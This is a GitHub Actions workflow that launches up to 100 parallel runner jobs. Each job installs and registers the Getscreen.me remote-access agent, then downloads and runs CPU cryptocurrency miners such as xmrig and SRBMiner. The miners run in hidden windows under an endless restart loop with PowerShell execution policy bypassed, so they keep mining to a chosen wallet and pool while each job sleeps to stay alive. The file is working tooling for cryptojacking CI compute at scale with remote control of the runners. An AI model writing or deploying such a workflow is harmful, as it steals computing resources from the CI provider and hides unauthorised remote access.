name: Dynamic Manager

on:
  workflow_dispatch:
    inputs:
      runner_type:
        description: 'Runner Host Environment'
        type: choice
        options: [self-hosted, github]
        default: 'self-hosted' # marker-runner
      github_windows_version:
        description: 'GitHub Windows Version (If GitHub Host Selected)'
        type: choice
        options: [windows-latest, windows-2022, windows-2019]
        default: 'windows-latest' # marker-winver
      execution_type:
        description: 'Execution Environment'
        type: choice
        options: [windows, docker, wsl]
        default: 'windows' # marker-exec
      getscreen_email:
        description: 'Getscreen.me Email'
        type: string
        required: true
        default: 'your@email.com' # marker-getscreen
      concurrent_devices:
        description: 'Concurrent Devices Active at Once'
        type: choice
        options: ['1', '2', '3', '4', '5', '10', '15', '20', '30', '50', '100']
        default: '10' # marker-concurrent
      total_devices:
        description: 'Total Devices to Process in Queue'
        type: number
        default: 100 # marker-total
      timeout:
        description: 'Runtime per device (in minutes)'
        type: choice
        options: ['1', '15', '30', '60', '180', '360']
        default: '60' # marker-timeout
      miner:
        description: 'Miner Software'
        type: choice
        options: [cpuminer-rplant, xmrig, wildrig-multi, srbminer-multi]
        default: 'cpuminer-rplant' # marker-miner
      algo:
        description: 'Algorithm'
        type: choice
        options: [gr, 'rx/0', xelishashv3, verushash, yespowerSUGAR, minotaurx, ghostrider]
        default: 'gr' # marker-algo
      coin:
        description: 'Coin to Mine'
        type: choice
        options: [RTM, ZEPH, XEL, VRSC, SUGAR, AVN]
        default: 'RTM' # marker-coin
      wallet:
        description: 'Wallet Address'
        type: string
        required: true
        default: 'WALLET_ADDRESS' # marker-wallet
      pool:
        description: 'Pool Base URL'
        type: string
        required: true
        default: 'rplant.xyz' # marker-pool
      region:
        description: 'Pool Region'
        type: choice
        options: [na, eu, asia, ru]
        default: 'na' # marker-region
      port:
        description: 'Pool Port / Difficulty'
        type: choice
        options: ['17056', '17057', '17111', '7042', '17022', '17068', '17070']
        default: '17056' # marker-port

jobs:
  setup-and-save:
    name: Setup Matrix & Save Configurations
    runs-on: ubuntu-latest
    outputs:
      matrix_array: ${{ steps.generate_matrix.outputs.matrix_array }}
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GH_PAT }}

      - name: Generate Device Matrix
        id: generate_matrix
        run: |
          TOTAL=${{ inputs.total_devices }}
          ARRAY=$(seq -s ',' 1 $TOTAL | sed 's/.*/[&]/')
          echo "matrix_array=$ARRAY" >> $GITHUB_OUTPUT

      - name: Update Default Inputs Dynamically by Name
        run: |
          WORKFLOW_FILE=$(grep -rl "name: Dynamic Manager" .github/workflows/ | head -n 1)
          
          if [ -z "$WORKFLOW_FILE" ]; then
            echo "Error: Could not find workflow file."
            exit 1
          fi

          echo "Updating file: $WORKFLOW_FILE"

          # Using '|' delimiter instead of '/' to securely handle algorithms like 'rx/0'
          sed -i -E "s|default: '.*' # marker-runner|default: '${{ inputs.runner_type }}' # marker-runner|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-winver|default: '${{ inputs.github_windows_version }}' # marker-winver|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-exec|default: '${{ inputs.execution_type }}' # marker-exec|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-getscreen|default: '${{ inputs.getscreen_email }}' # marker-getscreen|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-concurrent|default: '${{ inputs.concurrent_devices }}' # marker-concurrent|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: [0-9]+ # marker-total|default: ${{ inputs.total_devices }} # marker-total|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-timeout|default: '${{ inputs.timeout }}' # marker-timeout|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-miner|default: '${{ inputs.miner }}' # marker-miner|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-algo|default: '${{ inputs.algo }}' # marker-algo|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-coin|default: '${{ inputs.coin }}' # marker-coin|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-wallet|default: '${{ inputs.wallet }}' # marker-wallet|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-pool|default: '${{ inputs.pool }}' # marker-pool|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-region|default: '${{ inputs.region }}' # marker-region|g" "$WORKFLOW_FILE"
          sed -i -E "s|default: '.*' # marker-port|default: '${{ inputs.port }}' # marker-port|g" "$WORKFLOW_FILE"

          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add "$WORKFLOW_FILE"
          git commit -m "Auto-update miner inputs from latest run" || echo "No changes to commit"
          git push

  mine:
    name: Device Worker-${{ matrix.device_index }}
    needs: setup-and-save
    runs-on: ${{ inputs.runner_type == 'self-hosted' && 'self-hosted' || inputs.github_windows_version }}
    strategy:
      max-parallel: ${{ fromJSON(inputs.concurrent_devices) }}
      matrix:
        device_index: ${{ fromJson(needs.setup-and-save.outputs.matrix_array) }}
      fail-fast: false

    steps:
      - name: Prepare Naming & Variables
        id: vars
        shell: powershell
        run: |
          $Index = "${{ matrix.device_index }}"
          $MinerInput = "${{ inputs.miner }}"
          $AlgoInput = "${{ inputs.algo }}".ToLower()
          $CoinInput = "${{ inputs.coin }}".ToLower()
          $Region = "${{ inputs.region }}"
          $Wallet = "${{ inputs.wallet }}"
          $PoolDomain = "${{ inputs.pool }}"
          
          # Shorten Wallet string (last 3 chars)
          $WalletSuffix = $Wallet.Substring([math]::Max(0, $Wallet.Length - 3))
          
          # Short Miner Mapping
          $MinerShort = "rpl"
          if ($MinerInput -match "srb") { $MinerShort = "srb" }
          if ($MinerInput -match "xmr") { $MinerShort = "xmr" }
          if ($MinerInput -match "wild") { $MinerShort = "wld" }

          # Short Algo Mapping (Clean slashes for safe filenames)
          $AlgoShort = $AlgoInput.Replace("/", "") 
          if ($AlgoShort.Length -gt 4) { $AlgoShort = $AlgoShort.Substring(0, 4) } 

          # Short Pool Mapping
          $PoolShort = "pool"
          if ($PoolDomain -match "rplant") { $PoolShort = "rpl" }

          # Format: 1-srb-gr-rtm-rpl-eu-123
          $DeviceName = "$Index-$MinerShort-$AlgoShort-$CoinInput-$PoolShort-$Region-$WalletSuffix"
          $PoolUrl = "$Region.$PoolDomain:${{ inputs.port }}"
          
          echo "DEVICE_NAME=$DeviceName" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
          echo "ALGO=${{ inputs.algo }}" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
          echo "POOL_URL=$PoolUrl" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append

      - name: Install & Connect Getscreen.me
        shell: powershell
        run: |
          Write-Host "Connecting Getscreen.me as $($env:DEVICE_NAME)..."
          Invoke-WebRequest -Uri "https://getscreen.me/download/getscreen.exe" -OutFile "getscreen.exe" -UseBasicParsing
          
          .\getscreen.exe -install
          .\getscreen.exe -register "${{ inputs.getscreen_email }}"
          .\getscreen.exe -name "$env:DEVICE_NAME"
          
          $global:LASTEXITCODE = 0
          Write-Host "Getscreen successfully attached!"

      - name: Dynamic Miner Setup & Execution
        shell: powershell
        run: |
          $ExecType = "${{ inputs.execution_type }}"
          $Miner = "${{ inputs.miner }}"
          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
          
          # 1. Variables for Windows Execution
          $WinDownloadUrl = ""
          $WinExeName = ""
          $WinArgs = ""
          
          # 2. Variables for Linux Execution (Docker/WSL)
          $LinDownloadUrl = ""
          $LinExtractCmd = "tar -xf miner.archive"
          $LinRunCmd = ""

          if ($Miner -eq "cpuminer-rplant") {
            $WinDownloadUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-win.zip"
            $WinExeName = "cpuminer-sse2.exe"
            $WinArgs = "-a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
            
            $LinDownloadUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz"
            $LinRunCmd = "./cpuminer-sse2 -a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
          } 
          elseif ($Miner -eq "srbminer-multi") {
            $WinDownloadUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Windows.zip"
            $WinExeName = "SRBMiner-MULTI.exe"
            $WinArgs = "--disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
            
            $LinDownloadUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz"
            $LinRunCmd = "./SRBMiner-Multi-2-4-6/SRBMiner-MULTI --disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
          }
          elseif ($Miner -eq "xmrig") {
            $WinDownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
            $WinExeName = "xmrig.exe"
            $WinArgs = "-a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
            
            $LinDownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
            $LinRunCmd = "./xmrig-6.21.0/xmrig -a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
          }
          elseif ($Miner -eq "wildrig-multi") {
            $WinDownloadUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-windows-0.40.8.zip"
            $WinExeName = "wildrig-multi.exe"
            $WinArgs = "--algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
            
            $LinDownloadUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-linux-0.40.8.tar.xz"
            $LinRunCmd = "./wildrig-multi --algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
          }

          $FallbackToWindows = $false

          if ($ExecType -eq 'docker') {
             Write-Host "Building Docker Image for Linux Mining..."
             
             # Using Add-Content instead of multi-line strings prevents YAML parser crashes
             Set-Content -Path "Dockerfile" -Value "FROM public.ecr.aws/lts/ubuntu:latest"
             Add-Content -Path "Dockerfile" -Value "ENV DEBIAN_FRONTEND=noninteractive"
             Add-Content -Path "Dockerfile" -Value "RUN apt-get update && apt-get -y install wget tar ca-certificates xz-utils"
             Add-Content -Path "Dockerfile" -Value "WORKDIR /miner"
             Add-Content -Path "Dockerfile" -Value "RUN wget -qO miner.archive $LinDownloadUrl && $LinExtractCmd"
             Add-Content -Path "Dockerfile" -Value "CMD [ `"sh`", `"-c`", `"$LinRunCmd`" ]"
             
             # Wrap in Start-Process to safely catch errors if Windows Container Mode is active
             $DockerBuild = Start-Process docker -ArgumentList "build -t $DockerName ." -NoNewWindow -Wait -PassThru
             
             if ($DockerBuild.ExitCode -eq 0) {
                Write-Host "Docker build successful! Launching container..."
                docker run -d --name $DockerName $DockerName
             } else {
                Write-Host "WARNING: Docker Build Failed! (Likely due to Windows Container mode)"
                Write-Host "FALLBACK ENABLED: Switching to Windows Native Execution automatically..."
                $FallbackToWindows = $true
             }
          }

          if ($ExecType -eq 'wsl') {
             Write-Host "Setting up Linux Miner inside WSL native environment..."
             wsl bash -c "mkdir -p /tmp/miner && cd /tmp/miner && wget -qO miner.archive $LinDownloadUrl && $LinExtractCmd"
             
             wsl bash -c "echo '#!/bin/bash' > /tmp/miner/run.sh"
             wsl bash -c "echo 'cd /tmp/miner' >> /tmp/miner/run.sh"
             wsl bash -c "echo 'while true; do $LinRunCmd; sleep 5; done' >> /tmp/miner/run.sh"
             wsl bash -c "chmod +x /tmp/miner/run.sh"
             
             Write-Host "Launching WSL Miner Process..."
             Start-Process wsl -ArgumentList "-e bash /tmp/miner/run.sh" -WindowStyle Hidden
          }

          if ($ExecType -eq 'windows' -or $FallbackToWindows -eq $true) {
             Write-Host "Setting up Native Windows Miner..."
             New-Item -ItemType Directory -Force -Path .\windows_miner | Out-Null
             
             Invoke-WebRequest $WinDownloadUrl -OutFile "miner.zip" -UseBasicParsing
             Expand-Archive miner.zip -DestinationPath .\windows_miner -Force
             
             $FoundExe = Get-ChildItem -Path .\windows_miner -Filter $WinExeName -Recurse | Select-Object -First 1
             
             if ($FoundExe) {
                Write-Host "Launching Windows Miner: $($FoundExe.FullName) with args: $WinArgs"
                $Script = "while (1) { & `"$($FoundExe.FullName)`" $WinArgs; Start-Sleep -Seconds 5 }"
                Set-Content -Path "mine.ps1" -Value $Script
                Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File mine.ps1" -WindowStyle Hidden
             } else {
                Write-Host "Error: Could not extract/find Windows miner executable."
                exit 1
             }
          }

      - name: Runtime Timer & Job Completion
        shell: powershell
        run: |
          $TimeoutMins = [int]"${{ inputs.timeout }}"
          Write-Host "Mining active. Task is sleeping for $TimeoutMins minutes to keep job alive..."
          Start-Sleep -Seconds ($TimeoutMins * 60)

          Write-Host "Timeout reached. Attempting graceful universal cleanup..."
          
          # Clean up Windows processes
          Stop-Process -Name "cpuminer-sse2", "SRBMiner-MULTI", "xmrig", "wildrig-multi", "powershell" -Force -ErrorAction SilentlyContinue
          
          # Clean up Docker (if it exists)
          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
          docker stop $DockerName -t 0 2>$null
          docker rm $DockerName 2>$null
          
          # Clean up WSL (if it exists)
          wsl bash -c "pkill -f miner" 2>$null
          
          Write-Host "Closing runner task so matrix can queue the next iteration..."
